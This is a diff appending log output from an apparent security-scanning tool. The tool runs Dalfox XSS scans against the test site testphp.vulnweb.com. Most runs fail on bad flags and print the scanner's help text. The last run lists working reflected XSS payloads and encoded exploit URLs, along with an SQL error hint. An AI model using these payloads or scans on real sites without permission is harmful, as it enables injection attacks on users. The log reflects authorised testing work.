@@ -463,3 +463,1356 @@ Recommendations:
 2025-03-22 22:24:07,332 - INFO - security_api.__main__ - 
 Scan Results:
 2025-03-22 22:24:07,333 - INFO - security_api.__main__ - No SSRF vulnerabilities found.
+2025-03-22 22:26:59,246 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:26:59,251 - INFO - security_api.__main__ - Starting Dalfox scan test...
+2025-03-22 22:26:59,319 - INFO - security_api.__main__ - 
+Scan Results:
+2025-03-22 22:26:59,320 - INFO - security_api.__main__ - No vulnerabilities found.
+2025-03-22 22:29:11,339 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:29:11,345 - INFO - security_api.__main__ - Starting Dalfox scan test...
+2025-03-22 22:29:11,345 - INFO - security_api.__main__ - Scanning 8 URLs for domain: testphp.vulnweb.com
+2025-03-22 22:29:11,346 - INFO - security_api.dalfox_scanner - Starting Dalfox scan with command: dalfox file dalfox_results\urls_testphp.vulnweb.com_20250322_222911.txt --format json --output dalfox_results\dalfox_testphp.vulnweb.com_20250322_222911.txt --follow-redirects --scan-redirect --mining-dict --mining-dom --no-color --timeout 10 --found-action print --ignore-return --mass --report --deep --verify-ssl=false
+2025-03-22 22:29:11,414 - INFO - security_api.dalfox_scanner - Dalfox stdout: unknown flag: --scan-redirect
+
+2025-03-22 22:29:11,415 - ERROR - security_api.dalfox_scanner - Dalfox stderr: Error: unknown flag: --scan-redirect
+Usage:
+  dalfox file [filePath] [flags]
+
+Flags:
+      --har               [FORMAT] Using HAR format
+  -h, --help              help for file
+      --http              Using force http on rawdata mode
+      --mass              Parallel scanning N*Host mode (show only poc code)
+      --mass-worker int   Parallel worker of --mass and --multicast option (default 10)
+      --multicast         Parallel scanning N*Host mode (show only poc code)
+      --rawdata           [FORMAT] Using req rawdata from Burp/ZAP
+      --silence-force     Only print PoC (not print progress)
+
+Global Flags:
+  -b, --blind string                Add your blind xss
+                                      * Example: -b your-callback-url
+      --config string               Using config from file
+  -C, --cookie string               Add custom cookie
+      --cookie-from-raw string      Load cookie from burp raw http request
+                                      * Example: --cookie-from-raw request.txt
+      --custom-alert-type string    Change alert value type
+                                      * Example: --custom-alert-type=none / --custom-alert-type=str,none (default "none")
+      --custom-alert-value string   Change alert value
+                                      * Example: --custom-alert-value=document.cookie (default "1")
+      --custom-payload string       Add custom payloads from file
+  -d, --data string                 Using POST Method and add Body data
+      --debug                       debug mode, save all log using -o option
+      --deep-domxss                 DOM XSS Testing with more payloads on headless [so slow]
+      --delay int                   Milliseconds between send to same host (1000==1s)
+  -F, --follow-redirects            Following redirection
+      --format string               Stdout output format
+                                      * Supported: plain / json (default "plain")
+      --found-action string         If found weak/vuln, action(cmd) to next
+                                      * Example: --found-action='./notify.sh'
+      --found-action-shell string   Select shell application for --found-action (default "bash")
+      --grep string                 Using custom grepping file
+                                      * Example: --grep ./samples/sample_grep.json
+      --har-file-path string        Path to save HAR of scan requests to
+  -H, --header strings              Add custom headers
+      --ignore-param strings        Ignores this parameter when scanning.
+                                      * Example: --ignore-param api_token --ignore-param csrf_token
+      --ignore-return string        Ignores scanning from return code
+                                      * Example: --ignore-return 302,403,404
+  -X, --method string               Force overriding HTTP Method
+                                      * Example: -X PUT (default "GET")
+      --mining-dict                 Find new parameter with dictionary attack, default is Gf-Patterns=>XSS (default true)
+  -W, --mining-dict-word string     Custom wordlist file for param mining
+                                      * Example: --mining-dict-word word.txt
+      --mining-dom                  Find new parameter in DOM (attribute/js value) (default true)
+      --no-color                    Not use colorize
+      --no-spinner                  Not use spinner
+      --only-custom-payload         Only testing custom payload (required --custom-payload)
+      --only-discovery              Only testing parameter analysis (same '--skip-xss-scanning' option)
+      --only-poc string             Shows only the PoC code for the specified pattern (g: grep / r: reflected / v: verified)
+                                     * Example: --only-poc='g,v'
+  -o, --output string               Write to output file (By default, only the PoC code is saved)
+      --output-all                  All log write mode (-o or stdout)
+      --output-request              Include raw HTTP requests in the results.
+      --output-response             Include raw HTTP response in the results.
+  -p, --param strings               Only testing selected parameters
+      --poc-type string             Select PoC type 
+                                     * Supported: plain/curl/httpie/http-request
+                                     * Example: --poc-type='curl' (default "plain")
+      --proxy string                Send all request to proxy server
+                                      * Example: --proxy http://127.0.0.1:8080
+      --remote-payloads string      Using remote payload for XSS testing
+                                      * Supported: portswigger/payloadbox
+                                      * Example: --remote-payloads=portswigger,payloadbox
+      --remote-wordlists string     Using remote wordlists for param mining
+                                      * Supported: burp/assetnote
+                                      * Example: --remote-wordlists=burp
+      --report                      Show detail report
+      --report-format string        Format of --report flag [plain/json] (default "plain")
+  -S, --silence                     Only print PoC Code and Progress(for pipe/file mode)
+      --skip-bav                    Skipping BAV(Basic Another Vulnerability) analysis
+      --skip-grepping               Skipping built-in grepping
+      --skip-headless               Skipping headless browser base scanning[DOM XSS and inJS verify]
+      --skip-mining-all             Skipping ALL parameter mining
+      --skip-mining-dict            Skipping Dict base parameter mining
+      --skip-mining-dom             Skipping DOM base parameter mining
+      --skip-xss-scanning           Skipping XSS Scanning (same '--only-discovery' option)
+      --timeout int                 Second of timeout (default 10)
+      --user-agent string           Add custom UserAgent
+      --waf-evasion                 Avoid blocking by adjusting the speed when detecting WAF (worker=1 delay=3s)
+  -w, --worker int                  Number of worker (default 100)
+
+
+2025-03-22 22:29:11,421 - INFO - security_api.__main__ - 
+Scan Results:
+2025-03-22 22:29:11,422 - INFO - security_api.__main__ - No vulnerabilities found.
+2025-03-22 22:32:58,355 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:32:58,362 - INFO - security_api.__main__ - Starting Dalfox scan test...
+2025-03-22 22:32:58,362 - INFO - security_api.__main__ - Scanning 8 URLs for domain: testphp.vulnweb.com
+2025-03-22 22:32:58,363 - INFO - security_api.dalfox_scanner - Starting Dalfox scan with command: dalfox file dalfox_results\urls_testphp.vulnweb.com_20250322_223258.txt --format json --output dalfox_results\dalfox_testphp.vulnweb.com_20250322_223258.txt --follow-redirects --mining-dict --mining-dom --deep --silence --mass
+2025-03-22 22:32:58,442 - INFO - security_api.dalfox_scanner - Dalfox stdout: unknown flag: --deep
+
+2025-03-22 22:32:58,442 - ERROR - security_api.dalfox_scanner - Dalfox stderr: Error: unknown flag: --deep
+Usage:
+  dalfox file [filePath] [flags]
+
+Flags:
+      --har               [FORMAT] Using HAR format
+  -h, --help              help for file
+      --http              Using force http on rawdata mode
+      --mass              Parallel scanning N*Host mode (show only poc code)
+      --mass-worker int   Parallel worker of --mass and --multicast option (default 10)
+      --multicast         Parallel scanning N*Host mode (show only poc code)
+      --rawdata           [FORMAT] Using req rawdata from Burp/ZAP
+      --silence-force     Only print PoC (not print progress)
+
+Global Flags:
+  -b, --blind string                Add your blind xss
+                                      * Example: -b your-callback-url
+      --config string               Using config from file
+  -C, --cookie string               Add custom cookie
+      --cookie-from-raw string      Load cookie from burp raw http request
+                                      * Example: --cookie-from-raw request.txt
+      --custom-alert-type string    Change alert value type
+                                      * Example: --custom-alert-type=none / --custom-alert-type=str,none (default "none")
+      --custom-alert-value string   Change alert value
+                                      * Example: --custom-alert-value=document.cookie (default "1")
+      --custom-payload string       Add custom payloads from file
+  -d, --data string                 Using POST Method and add Body data
+      --debug                       debug mode, save all log using -o option
+      --deep-domxss                 DOM XSS Testing with more payloads on headless [so slow]
+      --delay int                   Milliseconds between send to same host (1000==1s)
+  -F, --follow-redirects            Following redirection
+      --format string               Stdout output format
+                                      * Supported: plain / json (default "plain")
+      --found-action string         If found weak/vuln, action(cmd) to next
+                                      * Example: --found-action='./notify.sh'
+      --found-action-shell string   Select shell application for --found-action (default "bash")
+      --grep string                 Using custom grepping file
+                                      * Example: --grep ./samples/sample_grep.json
+      --har-file-path string        Path to save HAR of scan requests to
+  -H, --header strings              Add custom headers
+      --ignore-param strings        Ignores this parameter when scanning.
+                                      * Example: --ignore-param api_token --ignore-param csrf_token
+      --ignore-return string        Ignores scanning from return code
+                                      * Example: --ignore-return 302,403,404
+  -X, --method string               Force overriding HTTP Method
+                                      * Example: -X PUT (default "GET")
+      --mining-dict                 Find new parameter with dictionary attack, default is Gf-Patterns=>XSS (default true)
+  -W, --mining-dict-word string     Custom wordlist file for param mining
+                                      * Example: --mining-dict-word word.txt
+      --mining-dom                  Find new parameter in DOM (attribute/js value) (default true)
+      --no-color                    Not use colorize
+      --no-spinner                  Not use spinner
+      --only-custom-payload         Only testing custom payload (required --custom-payload)
+      --only-discovery              Only testing parameter analysis (same '--skip-xss-scanning' option)
+      --only-poc string             Shows only the PoC code for the specified pattern (g: grep / r: reflected / v: verified)
+                                     * Example: --only-poc='g,v'
+  -o, --output string               Write to output file (By default, only the PoC code is saved)
+      --output-all                  All log write mode (-o or stdout)
+      --output-request              Include raw HTTP requests in the results.
+      --output-response             Include raw HTTP response in the results.
+  -p, --param strings               Only testing selected parameters
+      --poc-type string             Select PoC type 
+                                     * Supported: plain/curl/httpie/http-request
+                                     * Example: --poc-type='curl' (default "plain")
+      --proxy string                Send all request to proxy server
+                                      * Example: --proxy http://127.0.0.1:8080
+      --remote-payloads string      Using remote payload for XSS testing
+                                      * Supported: portswigger/payloadbox
+                                      * Example: --remote-payloads=portswigger,payloadbox
+      --remote-wordlists string     Using remote wordlists for param mining
+                                      * Supported: burp/assetnote
+                                      * Example: --remote-wordlists=burp
+      --report                      Show detail report
+      --report-format string        Format of --report flag [plain/json] (default "plain")
+  -S, --silence                     Only print PoC Code and Progress(for pipe/file mode)
+      --skip-bav                    Skipping BAV(Basic Another Vulnerability) analysis
+      --skip-grepping               Skipping built-in grepping
+      --skip-headless               Skipping headless browser base scanning[DOM XSS and inJS verify]
+      --skip-mining-all             Skipping ALL parameter mining
+      --skip-mining-dict            Skipping Dict base parameter mining
+      --skip-mining-dom             Skipping DOM base parameter mining
+      --skip-xss-scanning           Skipping XSS Scanning (same '--only-discovery' option)
+      --timeout int                 Second of timeout (default 10)
+      --user-agent string           Add custom UserAgent
+      --waf-evasion                 Avoid blocking by adjusting the speed when detecting WAF (worker=1 delay=3s)
+  -w, --worker int                  Number of worker (default 100)
+
+
+2025-03-22 22:32:58,448 - INFO - security_api.__main__ - 
+Scan Results:
+2025-03-22 22:32:58,448 - INFO - security_api.__main__ - No vulnerabilities found.
+2025-03-22 22:36:43,028 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:36:43,033 - INFO - security_api.__main__ - Starting Dalfox XSS scan test...
+2025-03-22 22:36:43,034 - INFO - security_api.__main__ - Scanning 4 URLs for domain: testphp.vulnweb.com
+2025-03-22 22:36:43,035 - INFO - security_api.dalfox_scanner - Starting Dalfox XSS scan with command: dalfox file dalfox_results\urls_testphp.vulnweb.com_20250322_223643.txt --format json --output dalfox_results\dalfox_testphp.vulnweb.com_20250322_223643.txt --follow-redirects --mining-dict --mining-dom --deep --silence --mass
+2025-03-22 22:36:43,095 - INFO - security_api.dalfox_scanner - Dalfox stdout: unknown flag: --deep
+
+2025-03-22 22:36:43,097 - ERROR - security_api.dalfox_scanner - Dalfox stderr: Error: unknown flag: --deep
+Usage:
+  dalfox file [filePath] [flags]
+
+Flags:
+      --har               [FORMAT] Using HAR format
+  -h, --help              help for file
+      --http              Using force http on rawdata mode
+      --mass              Parallel scanning N*Host mode (show only poc code)
+      --mass-worker int   Parallel worker of --mass and --multicast option (default 10)
+      --multicast         Parallel scanning N*Host mode (show only poc code)
+      --rawdata           [FORMAT] Using req rawdata from Burp/ZAP
+      --silence-force     Only print PoC (not print progress)
+
+Global Flags:
+  -b, --blind string                Add your blind xss
+                                      * Example: -b your-callback-url
+      --config string               Using config from file
+  -C, --cookie string               Add custom cookie
+      --cookie-from-raw string      Load cookie from burp raw http request
+                                      * Example: --cookie-from-raw request.txt
+      --custom-alert-type string    Change alert value type
+                                      * Example: --custom-alert-type=none / --custom-alert-type=str,none (default "none")
+      --custom-alert-value string   Change alert value
+                                      * Example: --custom-alert-value=document.cookie (default "1")
+      --custom-payload string       Add custom payloads from file
+  -d, --data string                 Using POST Method and add Body data
+      --debug                       debug mode, save all log using -o option
+      --deep-domxss                 DOM XSS Testing with more payloads on headless [so slow]
+      --delay int                   Milliseconds between send to same host (1000==1s)
+  -F, --follow-redirects            Following redirection
+      --format string               Stdout output format
+                                      * Supported: plain / json (default "plain")
+      --found-action string         If found weak/vuln, action(cmd) to next
+                                      * Example: --found-action='./notify.sh'
+      --found-action-shell string   Select shell application for --found-action (default "bash")
+      --grep string                 Using custom grepping file
+                                      * Example: --grep ./samples/sample_grep.json
+      --har-file-path string        Path to save HAR of scan requests to
+  -H, --header strings              Add custom headers
+      --ignore-param strings        Ignores this parameter when scanning.
+                                      * Example: --ignore-param api_token --ignore-param csrf_token
+      --ignore-return string        Ignores scanning from return code
+                                      * Example: --ignore-return 302,403,404
+  -X, --method string               Force overriding HTTP Method
+                                      * Example: -X PUT (default "GET")
+      --mining-dict                 Find new parameter with dictionary attack, default is Gf-Patterns=>XSS (default true)
+  -W, --mining-dict-word string     Custom wordlist file for param mining
+                                      * Example: --mining-dict-word word.txt
+      --mining-dom                  Find new parameter in DOM (attribute/js value) (default true)
+      --no-color                    Not use colorize
+      --no-spinner                  Not use spinner
+      --only-custom-payload         Only testing custom payload (required --custom-payload)
+      --only-discovery              Only testing parameter analysis (same '--skip-xss-scanning' option)
+      --only-poc string             Shows only the PoC code for the specified pattern (g: grep / r: reflected / v: verified)
+                                     * Example: --only-poc='g,v'
+  -o, --output string               Write to output file (By default, only the PoC code is saved)
+      --output-all                  All log write mode (-o or stdout)
+      --output-request              Include raw HTTP requests in the results.
+      --output-response             Include raw HTTP response in the results.
+  -p, --param strings               Only testing selected parameters
+      --poc-type string             Select PoC type 
+                                     * Supported: plain/curl/httpie/http-request
+                                     * Example: --poc-type='curl' (default "plain")
+      --proxy string                Send all request to proxy server
+                                      * Example: --proxy http://127.0.0.1:8080
+      --remote-payloads string      Using remote payload for XSS testing
+                                      * Supported: portswigger/payloadbox
+                                      * Example: --remote-payloads=portswigger,payloadbox
+      --remote-wordlists string     Using remote wordlists for param mining
+                                      * Supported: burp/assetnote
+                                      * Example: --remote-wordlists=burp
+      --report                      Show detail report
+      --report-format string        Format of --report flag [plain/json] (default "plain")
+  -S, --silence                     Only print PoC Code and Progress(for pipe/file mode)
+      --skip-bav                    Skipping BAV(Basic Another Vulnerability) analysis
+      --skip-grepping               Skipping built-in grepping
+      --skip-headless               Skipping headless browser base scanning[DOM XSS and inJS verify]
+      --skip-mining-all             Skipping ALL parameter mining
+      --skip-mining-dict            Skipping Dict base parameter mining
+      --skip-mining-dom             Skipping DOM base parameter mining
+      --skip-xss-scanning           Skipping XSS Scanning (same '--only-discovery' option)
+      --timeout int                 Second of timeout (default 10)
+      --user-agent string           Add custom UserAgent
+      --waf-evasion                 Avoid blocking by adjusting the speed when detecting WAF (worker=1 delay=3s)
+  -w, --worker int                  Number of worker (default 100)
+
+
+2025-03-22 22:36:43,102 - INFO - security_api.__main__ - 
+Scan Results:
+2025-03-22 22:36:43,103 - INFO - security_api.__main__ - No XSS vulnerabilities found.
+2025-03-22 22:37:02,005 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:37:02,011 - INFO - security_api.__main__ - Starting Dalfox XSS scan test...
+2025-03-22 22:37:02,012 - INFO - security_api.__main__ - Scanning 4 URLs for domain: testphp.vulnweb.com
+2025-03-22 22:37:02,013 - INFO - security_api.dalfox_scanner - Starting Dalfox XSS scan with command: dalfox file dalfox_results\urls_testphp.vulnweb.com_20250322_223702.txt --format json --output dalfox_results\dalfox_testphp.vulnweb.com_20250322_223702.txt --follow-redirects --mining-dict --mining-dom --deep --silence --mass
+2025-03-22 22:37:02,081 - INFO - security_api.dalfox_scanner - Dalfox stdout: unknown flag: --deep
+
+2025-03-22 22:37:02,081 - ERROR - security_api.dalfox_scanner - Dalfox stderr: Error: unknown flag: --deep
+Usage:
+  dalfox file [filePath] [flags]
+
+Flags:
+      --har               [FORMAT] Using HAR format
+  -h, --help              help for file
+      --http              Using force http on rawdata mode
+      --mass              Parallel scanning N*Host mode (show only poc code)
+      --mass-worker int   Parallel worker of --mass and --multicast option (default 10)
+      --multicast         Parallel scanning N*Host mode (show only poc code)
+      --rawdata           [FORMAT] Using req rawdata from Burp/ZAP
+      --silence-force     Only print PoC (not print progress)
+
+Global Flags:
+  -b, --blind string                Add your blind xss
+                                      * Example: -b your-callback-url
+      --config string               Using config from file
+  -C, --cookie string               Add custom cookie
+      --cookie-from-raw string      Load cookie from burp raw http request
+                                      * Example: --cookie-from-raw request.txt
+      --custom-alert-type string    Change alert value type
+                                      * Example: --custom-alert-type=none / --custom-alert-type=str,none (default "none")
+      --custom-alert-value string   Change alert value
+                                      * Example: --custom-alert-value=document.cookie (default "1")
+      --custom-payload string       Add custom payloads from file
+  -d, --data string                 Using POST Method and add Body data
+      --debug                       debug mode, save all log using -o option
+      --deep-domxss                 DOM XSS Testing with more payloads on headless [so slow]
+      --delay int                   Milliseconds between send to same host (1000==1s)
+  -F, --follow-redirects            Following redirection
+      --format string               Stdout output format
+                                      * Supported: plain / json (default "plain")
+      --found-action string         If found weak/vuln, action(cmd) to next
+                                      * Example: --found-action='./notify.sh'
+      --found-action-shell string   Select shell application for --found-action (default "bash")
+      --grep string                 Using custom grepping file
+                                      * Example: --grep ./samples/sample_grep.json
+      --har-file-path string        Path to save HAR of scan requests to
+  -H, --header strings              Add custom headers
+      --ignore-param strings        Ignores this parameter when scanning.
+                                      * Example: --ignore-param api_token --ignore-param csrf_token
+      --ignore-return string        Ignores scanning from return code
+                                      * Example: --ignore-return 302,403,404
+  -X, --method string               Force overriding HTTP Method
+                                      * Example: -X PUT (default "GET")
+      --mining-dict                 Find new parameter with dictionary attack, default is Gf-Patterns=>XSS (default true)
+  -W, --mining-dict-word string     Custom wordlist file for param mining
+                                      * Example: --mining-dict-word word.txt
+      --mining-dom                  Find new parameter in DOM (attribute/js value) (default true)
+      --no-color                    Not use colorize
+      --no-spinner                  Not use spinner
+      --only-custom-payload         Only testing custom payload (required --custom-payload)
+      --only-discovery              Only testing parameter analysis (same '--skip-xss-scanning' option)
+      --only-poc string             Shows only the PoC code for the specified pattern (g: grep / r: reflected / v: verified)
+                                     * Example: --only-poc='g,v'
+  -o, --output string               Write to output file (By default, only the PoC code is saved)
+      --output-all                  All log write mode (-o or stdout)
+      --output-request              Include raw HTTP requests in the results.
+      --output-response             Include raw HTTP response in the results.
+  -p, --param strings               Only testing selected parameters
+      --poc-type string             Select PoC type 
+                                     * Supported: plain/curl/httpie/http-request
+                                     * Example: --poc-type='curl' (default "plain")
+      --proxy string                Send all request to proxy server
+                                      * Example: --proxy http://127.0.0.1:8080
+      --remote-payloads string      Using remote payload for XSS testing
+                                      * Supported: portswigger/payloadbox
+                                      * Example: --remote-payloads=portswigger,payloadbox
+      --remote-wordlists string     Using remote wordlists for param mining
+                                      * Supported: burp/assetnote
+                                      * Example: --remote-wordlists=burp
+      --report                      Show detail report
+      --report-format string        Format of --report flag [plain/json] (default "plain")
+  -S, --silence                     Only print PoC Code and Progress(for pipe/file mode)
+      --skip-bav                    Skipping BAV(Basic Another Vulnerability) analysis
+      --skip-grepping               Skipping built-in grepping
+      --skip-headless               Skipping headless browser base scanning[DOM XSS and inJS verify]
+      --skip-mining-all             Skipping ALL parameter mining
+      --skip-mining-dict            Skipping Dict base parameter mining
+      --skip-mining-dom             Skipping DOM base parameter mining
+      --skip-xss-scanning           Skipping XSS Scanning (same '--only-discovery' option)
+      --timeout int                 Second of timeout (default 10)
+      --user-agent string           Add custom UserAgent
+      --waf-evasion                 Avoid blocking by adjusting the speed when detecting WAF (worker=1 delay=3s)
+  -w, --worker int                  Number of worker (default 100)
+
+
+2025-03-22 22:37:02,088 - INFO - security_api.__main__ - 
+Scan Results:
+2025-03-22 22:37:02,089 - INFO - security_api.__main__ - No XSS vulnerabilities found.
+2025-03-22 22:37:07,169 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:37:07,173 - INFO - security_api.__main__ - Starting Dalfox XSS scan test...
+2025-03-22 22:37:07,174 - INFO - security_api.__main__ - Scanning 4 URLs for domain: testphp.vulnweb.com
+2025-03-22 22:37:07,175 - INFO - security_api.dalfox_scanner - Starting Dalfox XSS scan with command: dalfox file dalfox_results\urls_testphp.vulnweb.com_20250322_223707.txt --format json --output dalfox_results\dalfox_testphp.vulnweb.com_20250322_223707.txt --follow-redirects --mining-dict --mining-dom --deep --silence --mass
+2025-03-22 22:37:07,234 - INFO - security_api.dalfox_scanner - Dalfox stdout: unknown flag: --deep
+
+2025-03-22 22:37:07,234 - ERROR - security_api.dalfox_scanner - Dalfox stderr: Error: unknown flag: --deep
+Usage:
+  dalfox file [filePath] [flags]
+
+Flags:
+      --har               [FORMAT] Using HAR format
+  -h, --help              help for file
+      --http              Using force http on rawdata mode
+      --mass              Parallel scanning N*Host mode (show only poc code)
+      --mass-worker int   Parallel worker of --mass and --multicast option (default 10)
+      --multicast         Parallel scanning N*Host mode (show only poc code)
+      --rawdata           [FORMAT] Using req rawdata from Burp/ZAP
+      --silence-force     Only print PoC (not print progress)
+
+Global Flags:
+  -b, --blind string                Add your blind xss
+                                      * Example: -b your-callback-url
+      --config string               Using config from file
+  -C, --cookie string               Add custom cookie
+      --cookie-from-raw string      Load cookie from burp raw http request
+                                      * Example: --cookie-from-raw request.txt
+      --custom-alert-type string    Change alert value type
+                                      * Example: --custom-alert-type=none / --custom-alert-type=str,none (default "none")
+      --custom-alert-value string   Change alert value
+                                      * Example: --custom-alert-value=document.cookie (default "1")
+      --custom-payload string       Add custom payloads from file
+  -d, --data string                 Using POST Method and add Body data
+      --debug                       debug mode, save all log using -o option
+      --deep-domxss                 DOM XSS Testing with more payloads on headless [so slow]
+      --delay int                   Milliseconds between send to same host (1000==1s)
+  -F, --follow-redirects            Following redirection
+      --format string               Stdout output format
+                                      * Supported: plain / json (default "plain")
+      --found-action string         If found weak/vuln, action(cmd) to next
+                                      * Example: --found-action='./notify.sh'
+      --found-action-shell string   Select shell application for --found-action (default "bash")
+      --grep string                 Using custom grepping file
+                                      * Example: --grep ./samples/sample_grep.json
+      --har-file-path string        Path to save HAR of scan requests to
+  -H, --header strings              Add custom headers
+      --ignore-param strings        Ignores this parameter when scanning.
+                                      * Example: --ignore-param api_token --ignore-param csrf_token
+      --ignore-return string        Ignores scanning from return code
+                                      * Example: --ignore-return 302,403,404
+  -X, --method string               Force overriding HTTP Method
+                                      * Example: -X PUT (default "GET")
+      --mining-dict                 Find new parameter with dictionary attack, default is Gf-Patterns=>XSS (default true)
+  -W, --mining-dict-word string     Custom wordlist file for param mining
+                                      * Example: --mining-dict-word word.txt
+      --mining-dom                  Find new parameter in DOM (attribute/js value) (default true)
+      --no-color                    Not use colorize
+      --no-spinner                  Not use spinner
+      --only-custom-payload         Only testing custom payload (required --custom-payload)
+      --only-discovery              Only testing parameter analysis (same '--skip-xss-scanning' option)
+      --only-poc string             Shows only the PoC code for the specified pattern (g: grep / r: reflected / v: verified)
+                                     * Example: --only-poc='g,v'
+  -o, --output string               Write to output file (By default, only the PoC code is saved)
+      --output-all                  All log write mode (-o or stdout)
+      --output-request              Include raw HTTP requests in the results.
+      --output-response             Include raw HTTP response in the results.
+  -p, --param strings               Only testing selected parameters
+      --poc-type string             Select PoC type 
+                                     * Supported: plain/curl/httpie/http-request
+                                     * Example: --poc-type='curl' (default "plain")
+      --proxy string                Send all request to proxy server
+                                      * Example: --proxy http://127.0.0.1:8080
+      --remote-payloads string      Using remote payload for XSS testing
+                                      * Supported: portswigger/payloadbox
+                                      * Example: --remote-payloads=portswigger,payloadbox
+      --remote-wordlists string     Using remote wordlists for param mining
+                                      * Supported: burp/assetnote
+                                      * Example: --remote-wordlists=burp
+      --report                      Show detail report
+      --report-format string        Format of --report flag [plain/json] (default "plain")
+  -S, --silence                     Only print PoC Code and Progress(for pipe/file mode)
+      --skip-bav                    Skipping BAV(Basic Another Vulnerability) analysis
+      --skip-grepping               Skipping built-in grepping
+      --skip-headless               Skipping headless browser base scanning[DOM XSS and inJS verify]
+      --skip-mining-all             Skipping ALL parameter mining
+      --skip-mining-dict            Skipping Dict base parameter mining
+      --skip-mining-dom             Skipping DOM base parameter mining
+      --skip-xss-scanning           Skipping XSS Scanning (same '--only-discovery' option)
+      --timeout int                 Second of timeout (default 10)
+      --user-agent string           Add custom UserAgent
+      --waf-evasion                 Avoid blocking by adjusting the speed when detecting WAF (worker=1 delay=3s)
+  -w, --worker int                  Number of worker (default 100)
+
+
+2025-03-22 22:37:07,242 - INFO - security_api.__main__ - 
+Scan Results:
+2025-03-22 22:37:07,242 - INFO - security_api.__main__ - No XSS vulnerabilities found.
+2025-03-22 22:37:56,805 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:37:56,811 - INFO - security_api.__main__ - Starting Dalfox XSS scan test...
+2025-03-22 22:37:56,812 - INFO - security_api.__main__ - Scanning 4 URLs for domain: testphp.vulnweb.com
+2025-03-22 22:37:56,812 - INFO - security_api.dalfox_scanner - Starting Dalfox XSS scan with command: dalfox file dalfox_results\urls_testphp.vulnweb.com_20250322_223756.txt --format json --output dalfox_results\dalfox_testphp.vulnweb.com_20250322_223756.txt --follow-redirects --mining-dict --mining-dom --silence --mass
+2025-03-22 22:38:04,470 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:38:04,475 - INFO - security_api.__main__ - Starting Dalfox XSS scan test...
+2025-03-22 22:38:04,476 - INFO - security_api.__main__ - Scanning 4 URLs for domain: testphp.vulnweb.com
+2025-03-22 22:38:04,477 - INFO - security_api.dalfox_scanner - Starting Dalfox XSS scan with command: dalfox file dalfox_results\urls_testphp.vulnweb.com_20250322_223804.txt --format json --output dalfox_results\dalfox_testphp.vulnweb.com_20250322_223804.txt --follow-redirects --mining-dict --mining-dom --silence --mass
+2025-03-22 22:38:58,973 - INFO - security_api.dalfox_scanner - Dalfox stdout: [
+{"type":"G","inject_type":"BUILTIN","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/search.php?test=%27+or+","param":"","payload":"toGrepping","evidence":"","cwe":"","severity":"Low","message_id":77,"message_str":"Found dalfox-error-mysql1 via built-in grepping / payload: toGrepping"},
+{"type":"V","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/search.php?test=query%27%3E%3CsVg%2Fonload%3Dalert%281%29+class%3Ddalfox%3E","param":"test","payload":"'\u003e\u003csVg/onload=alert(1) class=dalfox\u003e","evidence":"49 line:   syntax to use near '\u003e\u003csVg/onload=alert(1) class=dalfox\u003e'' at line 1","cwe":"CWE-79","severity":"High","message_id":183,"message_str":"Triggered XSS Payload (found DOM Object): test='\u003e\u003csVg/onload=alert(1) class=dalfox\u003e"},
+{"type":"R","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%22%3E%3Ca+href%3Djavas%26%2399%3Bript%3Aalert%281%29%2Fclass%3Ddalfox%3Eclick","param":"artist","payload":"\"\u003e\u003ca href=javas\u0026#99;ript:alert(1)/class=dalfox\u003eclick","evidence":"49 line:  syntax to use near '\"\u003e\u003ca href=javas\u0026#99;ript:alert(1)/class=dalfox\u003eclick' at lin","cwe":"CWE-79","severity":"Medium","message_id":585,"message_str":"Reflected Payload in HTML: artist=\"\u003e\u003ca href=javas\u0026#99;ript:alert(1)/class=dalfox\u003eclick"},
+{"type":"R","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%27%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E","param":"artist","payload":"'\u003e\u003cimg/src/onerror=.1|alert``\u003e","evidence":"49 line:  syntax to use near ''\u003e\u003cimg/src/onerror=.1|alert``\u003e' at line 1","cwe":"CWE-79","severity":"Medium","message_id":649,"message_str":"Reflected Payload in HTML: artist='\u003e\u003cimg/src/onerror=.1|alert``\u003e"},
+{"type":"R","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%22%3E%3Cscript+y%3D%22%3E%3C%22%3E%2F%2A%3Cscript%2A+%2A%2Fprompt%28%29%3C%2Fscript","param":"artist","payload":"\"\u003e\u003cscript y=\"\u003e\u003c\"\u003e/*\u003cscript* */prompt()\u003c/script","evidence":"49 line:  syntax to use near '\"\u003e\u003cscript y=\"\u003e\u003c\"\u003e/*\u003cscript* */prompt()\u003c/script' at line 1","cwe":"CWE-79","severity":"Medium","message_id":665,"message_str":"Reflected Payload in HTML: artist=\"\u003e\u003cscript y=\"\u003e\u003c\"\u003e/*\u003cscript* */prompt()\u003c/script"},
+{"type":"R","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%22%3E%3Ca+href%3D%22javascript%26colon%3Balert%281%29%22%3Eclick","param":"artist","payload":"\"\u003e\u003ca href=\"javascript\u0026colon;alert(1)\"\u003eclick","evidence":"49 line:  syntax to use near '\"\u003e\u003ca href=\"javascript\u0026colon;alert(1)\"\u003eclick' at line 1","cwe":"CWE-79","severity":"Medium","message_id":677,"message_str":"Reflected Payload in HTML: artist=\"\u003e\u003ca href=\"javascript\u0026colon;alert(1)\"\u003eclick"},
